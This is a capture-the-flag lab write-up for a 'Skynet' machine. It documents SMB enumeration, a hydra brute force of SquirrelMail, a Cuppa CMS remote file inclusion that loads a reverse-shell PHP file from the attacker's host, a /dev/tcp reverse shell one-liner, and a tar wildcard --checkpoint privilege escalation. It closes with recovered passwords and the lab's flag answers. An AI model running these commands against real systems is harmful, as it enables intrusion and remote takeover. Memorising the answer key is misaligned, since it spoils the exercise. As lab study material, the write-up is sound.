# Skynet - Easy

<details>
<summary>Nmap scan</summary>

```shell
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_pop3-capabilities: AUTH-RESP-CODE CAPA SASL TOP UIDL RESP-CODES PIPELINING
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_imap-capabilities: IDLE capabilities post-login LOGIN-REFERRALS LOGINDISABLEDA0001 LITERAL+ more IMAP4rev1 SASL-IR Pre-login listed ENABLE ID OK have
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m13s, median: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-08-01T17:05:19
|_  start_date: N/A
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-08-01T12:05:19-05:00
```

</details>

<br>

```markdown
We begin with the Nmap scan with the -Pn flag.

On checking the website at <http://10.10.123.65>, we are greeted with Skynet Search.

The search does not work and the source code for the website does not yield any results.

Meanwhile, we can attempt to enumerate Samba shares using enum4linux tool.

This gives us info about user 'milesdyson', and includes 4 shares - print$, anonymous, milesdyson and IPC$.

We can access the 'anonymous' share without password.

From the files available on the share, we find a wordlist.

Simultaneously, we can scan the website directory.

We get results such as /admin, /css, /js, /config and /squirrelmail

We can access only the /squirrelmail directory, which leads us to a login page.

We can brute-force our way in using the username 'milesdyson' and passwords from the wordlist we got earlier.

Using the creds milesdyson:cyborg007haloterminator, we login to the mail page, where we find the new samba share password: )s{A&2Z=F^n_E.B` for Miles.

milesdyson's share includes a txt file which includes the directory /45kra24zxs28v3yd.

<http://10.10.123.65/45kra24zxs28v3yd> leads to Miles Dyson's personal page.

We can scan this website for hidden directories as well.

On using Gobuster to scan the website, we get the /administrator directory, leading to a Cuppa CMS page.

After some recon, we find out that Cuppa CMS has an exploit related to it, based on RFI (Remote File Inclusion).

Following the exploit, we setup a listener and host a Python server to upload the reverse-shell PHP file.

After this, we can visit the following URL: <http://10.10.123.65/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.17.48.136:8000/reverse-shell.php>, where the part after urlConfig needs to contain our IP.

On getting shell access, we start enumeration.

We can see that this machine has some cronjobs, and it includes a script.

Now the script calls a shell, navigates to a directory and takes backup using tar and wildcards.

This can be exploited, and we can refer multiple blogs which cover tar wildcard and checkpoint exploitation.

For the root shell, we setup a listener and the payload is inserted into a script, which is also included in the backup directory.

After executing the required command, we get root access.
```

```shell
nmap -Pn -T4 --top-ports 10000 -A 10.10.123.65

gobuster dir -u http://10.10.123.65 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

enum4linux -U -S 10.10.123.65

smbclient //10.10.123.65/anonymous

#gives access to smb share
help

ls

get attention.txt

cd logs

ls

mget log*

exit

hydra -l milesdyson -P terminatorlist.txt 10.10.123.65 http-post-form "/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^:incorrect"

#after getting password from squirrelmail
smbclient //10.10.123.65/milesdyson -U milesdyson
#-U for username
#gives access to milesdyson's share
ls

cd notes

get important.txt

exit

cat important.txt
#this includes the beta directory

gobuster dir -u http://10.10.123.65/45kra24zxs28v3yd/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

#for exploit
nc -nvlp 1234

python3 -m http.server
#for uploading reverse-shell.php
#once we visit the required URL, we get shell access

#in remote shell
pwd

cat /home/milesdyson/user.txt
#user flag
#we can proceed with attempting to escalate our privileges

cat /etc/crontab
#shows backup script and its path

cat backups/backup.sh
#shows script content

printf '#!/bin/bash\nbash -i >& /dev/tcp/10.17.48.136/4445 0>&1' > /var/www/html/shell
#creates shell script

chmod +x /var/www/html/shell

touch /var/www/html/--checkpoint=1

touch /var/www/html/--checkpoint-action=exec=bash\ shell

#after a minute, we get root access on our listener
cat /root/root.txt
```

```markdown
1. What is Miles password for his emails? - cyborg007haloterminator

2. What is the hidden directory? - /45kra24zxs28v3yd

3. What is the vulnerability called when you can include a remote file for malicious purposes? - Remote File Inclusion

4. What is the user flag? - 7ce5c2109a40f958099283600a9ae807

5. What is the root flag? - 3f0372db24753accc7179a282cd6a949
```
